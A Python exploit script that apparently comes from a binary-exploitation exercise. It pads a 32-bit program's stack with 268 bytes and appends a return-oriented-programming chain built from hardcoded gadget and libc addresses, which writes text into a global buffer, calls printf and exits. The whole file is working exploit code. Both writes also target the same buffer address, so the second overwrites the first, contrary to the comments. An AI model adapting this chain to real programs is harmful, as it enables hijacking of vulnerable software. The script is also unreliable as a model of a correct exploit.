import sys
import struct


POP_EAX_RET = 0x08049193
POP_ECX_RET = 0x08049195
MOV_DWORD_EAX_ECX = 0x08049197
G_BUFFER = 0x0804c040

LIB_C = 0xf7d89000
PRINTF = LIB_C + 0x000574f0
EXIT = LIB_C + 0x0003a1c0


def build_A(n: int):
    return b'A' * n

def build_ROP():
    rop = b''
    # write 'HACK'
    rop += struct.pack("<I", POP_ECX_RET) # pop ecx; ret;
    rop += struct.pack("<I", 0x4b434148) # HACK (KCAH)
    # eax -> g_buffer
    rop += struct.pack("<I", POP_EAX_RET) # pop eax; ret;
    rop += struct.pack("<I", G_BUFFER) # g_buffer
    rop += struct.pack("<I", MOV_DWORD_EAX_ECX) # mov dword ptr [eax], ecx ; ret

    # WRITE ED
    rop += struct.pack("<I", POP_ECX_RET) # pop ecx; ret;
    rop += struct.pack("<I", 0x21214445) # ED!! (!!DE)

    rop += struct.pack("<I", POP_EAX_RET) # pop eax; ret;
    rop += struct.pack("<I", G_BUFFER) # g_buffer
    rop += struct.pack("<I", MOV_DWORD_EAX_ECX) # mov dword ptr [eax], ecx ; ret


    # printf(&g_buffer)
    rop += struct.pack("<I",PRINTF) # call printf 0x000574f0
    # eax -> g_buffer, back to the beginning of g_buffer (arg 1) 
    rop += struct.pack("<I", POP_EAX_RET) # pop eax; ret;
    rop += struct.pack("<I", G_BUFFER) # g_buffer

    # exit(0)
    rop += struct.pack("<I",EXIT) # call exit 0003a1c0
    rop += struct.pack("<I", POP_EAX_RET) # pop eax; ret;
    rop += struct.pack("<I", 0x00000000) # 0


    return rop

payload = build_A(268) + build_ROP()

sys.stdout.buffer.write(payload)